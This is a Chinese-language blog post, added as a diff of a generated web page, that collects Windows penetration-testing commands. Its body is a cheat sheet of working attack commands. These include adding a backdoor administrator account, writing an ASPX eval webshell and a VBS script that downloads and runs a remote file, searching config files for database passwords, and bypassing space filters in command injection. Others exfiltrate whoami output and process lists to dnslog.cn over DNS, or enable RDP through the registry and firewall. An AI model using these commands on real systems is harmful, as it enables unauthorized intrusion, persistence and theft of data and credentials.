@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>70windows渗透技巧 | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>70windows渗透技巧</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-05-06
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="70windows渗透技巧"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="windows渗透技巧"><a href="#windows渗透技巧" class="headerlink" title="windows渗透技巧"></a>windows渗透技巧</h2><h3 id="利用-amp-管道符执行多条命令"><a href="#利用-amp-管道符执行多条命令" class="headerlink" title="利用|/&amp;管道符执行多条命令"></a>利用|/&amp;管道符执行多条命令</h3><p>常用于查找远程桌面端口号、异常网络连接以及添加管理员用户</p>
+<p>netstat -ano | findstr “ESTABLISHED”<br>net user 90sec 123456 /ad &amp; net localgroup administrators 90sec /ad</p>
+<h3 id="利用-转义符解决-lt-gt-字符问题"><a href="#利用-转义符解决-lt-gt-字符问题" class="headerlink" title="利用^转义符解决&lt;&gt;字符问题"></a>利用^转义符解决&lt;&gt;字符问题</h3><p>常用于写入Webshell木马文件时对&lt;&gt;、&amp;等特殊字符的转义，不加写不了</p>
+<p>echo ^&lt;%@Page Language=”Jscript” validateRequest=”false”%^&gt;^&lt;%Response.Write(eval(Request.Item[“w”],”unsafe”));%^&gt; &gt; c:\Users\Desktop\ok.aspx</p>
+<h3 id="利用dir-for等命令查找网站路径"><a href="#利用dir-for等命令查找网站路径" class="headerlink" title="利用dir/for等命令查找网站路径"></a>利用dir/for等命令查找网站路径</h3><p>常用于内网信息搜集查找铭感文件和内容，也可根据文件名、扩展以及内容来查找文件所在位置绝对路径，如：</p>
+<ol>
+<li>网站路径和数据库连接文件</li>
+<li>被黑灰产修改过的（跳转）脚本文件等</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;a&#x2F;b&#x2F;s D:\web\*.asp</span><br><span class="line">where &#x2F;r D:\web\ *.php *.asp</span><br><span class="line">for &#x2F;r D:\web\ %i in (*.php *.asp) do @echo %i</span><br><span class="line">%windir%\system32\inetsrv\appcmd list VDIR</span><br><span class="line"></span><br><span class="line">findstr &#x2F;n &#x2F;s &#x2F;i &quot;uid&#x3D;sa&quot; E:\ftp_bak\*.config</span><br><span class="line">findstr &#x2F;n &#x2F;s &#x2F;i &quot;DB_PWD&quot; D:\www\*.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-冒号将VBS脚本代码写在一行"><a href="#利用-冒号将VBS脚本代码写在一行" class="headerlink" title="利用:冒号将VBS脚本代码写在一行"></a>利用:冒号将VBS脚本代码写在一行</h3><p>常用于命令行下写入Webshell木马、VBS添加用户、下载者等恶意脚本，&gt;创建，&gt;&gt;叠加，注意2、4、8、9行中的&amp;管道符，也要用^转义下才能正常写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo set wsnetwork&#x3D;CreateObject(&quot;WSCRIPT.NETWORK&quot;) &gt; C:\adduser.vbs</span><br><span class="line">echo os&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;^&amp;wsnetwork.ComputerName &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo Set ob&#x3D;GetObject(os) &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo Set oe&#x3D;GetObject(os^&amp;&quot;&#x2F;Administrators,group&quot;) &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo Set od&#x3D;ob.Create(&quot;user&quot;,&quot;betasec&quot;) &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo od.SetPassword &quot;pass!@#!23&quot; &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo od.SetInfo &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo Set of&#x3D;GetObject(os^&amp;&quot;&#x2F;betasec&quot;,user) &gt;&gt; C:\adduser.vbs</span><br><span class="line">echo oe.add os^&amp;&quot;&#x2F;betasec&quot; &gt;&gt; C:\adduser.vbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-gt-gt-gt-重定向符叠加写入VBS"><a href="#利用-gt-gt-gt-重定向符叠加写入VBS" class="headerlink" title="利用&gt;/&gt;&gt;重定向符叠加写入VBS"></a>利用&gt;/&gt;&gt;重定向符叠加写入VBS</h3><p>常用于MSSQL高权限注入点写入VBS脚本文件，一行一行写过于繁琐。VBScript可以在一行代码内同时对两个变量进行赋值，中间用冒号分隔即可，脚本可正常执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Set Post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;):Set Shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;):Post.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;adduser.txt&quot;,0 :Post.Send():Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;):aGet.Mode &#x3D; 3:aGet.Type &#x3D; 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile &quot;c:\adduser.vbs&quot;,2:wscript.sleep 1000:Shell.Run (&quot;c:\adduser.vbs&quot;) &gt; c:\down.vbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用for命令探测工作组-域存活主机"><a href="#利用for命令探测工作组-域存活主机" class="headerlink" title="利用for命令探测工作组/域存活主机"></a>利用for命令探测工作组/域存活主机</h3><p>常用于探测工作组和域内存活主机，用的是Ping命令，基于ICMP协议，但如果禁Ping时该方法则无效，利用此方法在实际应用中可能需要做少许修改：内网IP或网段</p>
+<p>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i “ttl=”</p>
+<p>将存活主机写入到文件</p>
+<p>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i “ttl=” &gt;nul &amp; if errorlevel 1 (echo 192.168.1.%i May be sleeping ! &gt;&gt; result.txt) else (echo 192.168.1.%i is alive ! &gt;&gt; result.txt)</p>
+<p>查看扫描后的存活主机：<br>type result.txt | findstr “alive”</p>
+<p>工作组/域内存活主机探测<br>这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">@echo.</span><br><span class="line">@FOR &#x2F;F &quot;usebackq delims&#x3D;, &quot; %%J IN (&#96;net view &#x2F;domain ^|find &quot;命令成功完成&quot; &#x2F;v ^|find &quot;The command completed successfully.&quot; &#x2F;v ^|find &quot;命令成功完成&quot; &#x2F;v ^|find &quot;--&quot; &#x2F;v ^|find &quot;Domain&quot; &#x2F;v ^|find &quot;&quot; &#x2F;v ^|find &quot;コマンドは正常に終了しました&quot; &#x2F;v &#x2F;i&#96;) do (</span><br><span class="line">@echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Domain:%%J &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">@FOR &#x2F;F &quot;usebackq eol&#x3D;; delims&#x3D;, &quot; %%i in (&#96;net view &#x2F;domain:%%J ^|findstr &quot;\\&quot;&#96;) do (</span><br><span class="line">@FOR &#x2F;F &quot;usebackq eol&#x3D;; tokens&#x3D;1,2,3* delims&#x3D;\\&quot; %%a in (&#96;@echo %%i&#96;) do (</span><br><span class="line">ping %%a -4 -n 1 -w 100 |find &#x2F;i &quot;ping&quot; &gt; %%a.txt</span><br><span class="line">@FOR &#x2F;F &quot;tokens&#x3D;2 delims&#x3D;[]&quot; %%b in (%%a.txt) do @echo \\%%a &#x3D; [%%b]</span><br><span class="line">@del &#x2F;f &#x2F;q %%a.txt</span><br><span class="line">)))</span><br><span class="line">@echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Getting IP Complete &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用符号或者环境变量截取绕过空格"><a href="#利用符号或者环境变量截取绕过空格" class="headerlink" title="利用符号或者环境变量截取绕过空格"></a>利用符号或者环境变量截取绕过空格</h3><p>常用于命令执行漏洞绕过，在代码层面或安全防护中过滤了空格，也就是在执行命令时不能带有空格，最近几天在几个群里都看到有人讨论这个问题，也属常见问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo.123&gt;&gt;a.txt</span><br><span class="line">echo,123&gt;&gt;a.txt</span><br><span class="line">type;a.txt</span><br><span class="line">[...SNIP...]</span><br><span class="line"></span><br><span class="line">&amp;cd;..&amp;cd;..&amp;cd;windows&amp;cd;system32</span><br><span class="line">&amp;cd;..&amp;cd;1631359215&amp;cs.jpg&amp;.jpg</span><br><span class="line">[...SNIP...]</span><br></pre></td></tr></table></figure>
+
+<p>命令注入靶场空格过滤绕过测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%path:~10,1%</span><br><span class="line">%programfiles:~10,1%</span><br><span class="line">%processor_identifier:~7,1%</span><br><span class="line">%commonprogramw6432:~10,1%</span><br><span class="line">%commonprogramfiles(x86):~10,1%</span><br><span class="line">%commonprogramfiles:~10,1%</span><br><span class="line">%commonprogramfiles:~10,-18%</span><br><span class="line">%commonprogramfiles:~23,1%</span><br><span class="line">%fps_browser_app_profile_string:~8,1%</span><br><span class="line">[...SNIP...]</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用dnslog查看注入点执行命令结果"><a href="#利用dnslog查看注入点执行命令结果" class="headerlink" title="利用dnslog查看注入点执行命令结果"></a>利用dnslog查看注入点执行命令结果</h3><p>常用于探测目标主机的DNS协议是否能够出网，或者是在高权限注入无回显时也可以通过dnslog来将命令执行结果带出，如：查看当前用户和进程列表等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ******.dnslog.cn</span><br><span class="line">nslookup ******.dnslog.cn</span><br><span class="line">&lt;?php gethostbyname(&quot;******.dnslog.cn&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查询当前用户权限</p>
+<p>for /F %i in (‘whoami’) do nslookup %i.lr5dyr.dnslog.cn</p>
+<p>cmd /v /c “whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V “CERTIFICATE” temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.ly9hvm.dnslog.cn &amp;&amp; nslookup !FINAL!” &amp;&amp; del temp*</p>
+<h3 id="利用dnslog查看目标主机的杀毒软件"><a href="#利用dnslog查看目标主机的杀毒软件" class="headerlink" title="利用dnslog查看目标主机的杀毒软件"></a>利用dnslog查看目标主机的杀毒软件</h3><p>用于MSSQL高权限注入，目标主机不出网，但想利用dnslog探测主机中是否有杀软？两种方法原理一样，都是先获取进程列表，然后for、ForEach循环Ping、nslookup通过dnslog带出来</p>
+<p>for /F %i in (‘wmic process get Name ^| findstr “.exe”‘) do ping -n 1 %i.<strong>**</strong>.dnslog.cn &gt;nul</p>
+<p>powershell -c “Get-Process | select processname &gt; 1.txt”<br>powershell -c “Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object {if($_ -match $regex){$b=$_.trim();ping -n 1 $b’.***fks2j.ns.dns3.cf.’} }”</p>
+<h3 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h3><p>启用远程桌面<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
+<p>netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes</p>
+<p>禁用远程桌面<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f</p>
+<p>netsh advfirewall firewall set rule group=”remote desktop” new enable=No</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/70windows%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/69badusb/" target="_self">69badusb</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/71Wpscan/" target="_self">71Wpscan</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
